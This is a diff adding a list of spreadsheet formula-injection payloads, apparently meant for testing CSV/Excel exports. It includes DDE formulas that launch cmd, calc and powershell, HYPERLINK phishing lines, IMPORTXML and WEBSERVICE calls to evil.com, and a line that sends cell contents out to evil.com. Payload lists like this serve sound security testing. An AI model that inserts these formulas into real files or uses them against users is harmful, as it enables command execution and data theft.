@@ -1,0 +1,58 @@
+# Formula Injection payloads - test for CSV/Excel formula execution
+# These formulas execute when opened in spreadsheet applications
+
+# Basic formula execution (safe - just calculations)
+=1+1
+=2+2
+=10*10
+
+# Command execution formulas (dangerous)
+=cmd|'/c calc'!A1
+=cmd|'/c powershell'!A1
+
+# DDE (Dynamic Data Exchange) exploitation
+=cmd|'/c notepad'!'A1'
+@SUM(1+1)*cmd|'/c calc'!A1
+
+# HYPERLINK formula (can be used for phishing)
+=HYPERLINK("http://evil.com","Click me")
+=HYPERLINK("file:///C:/Windows/System32/calc.exe","Click")
+
+# Concatenation with commands
+=1+1+cmd|'/c calc'!A1
+="test"&cmd|'/c notepad'!A1
+
+# Alternative formula starters
++1+1
+-1+1
+@SUM(1+1)
+=2+2
+
+# DDE with various applications
+=Excel|'calc'!A1
+=Word|'notepad'!A1
+=cmd|'/c cmd'!A1
+
+# Multiple formula characters
+==1+1
+=+=1+1
+=-=1+1
+=@=1+1
+
+# Command execution via different methods
+|=1+1
+%=1+1
++=1+1
+
+# Formula with special characters
+="=1+1"
+'=1+1
+ =1+1
+	=1+1
+
+# Remote file inclusion
+=IMPORTXML("http://evil.com/data.xml", "//root")
+=WEBSERVICE("http://evil.com/api")
+
+# Data exfiltration patterns
+=HYPERLINK(CONCATENATE("http://evil.com/?data=",A1),"Click")
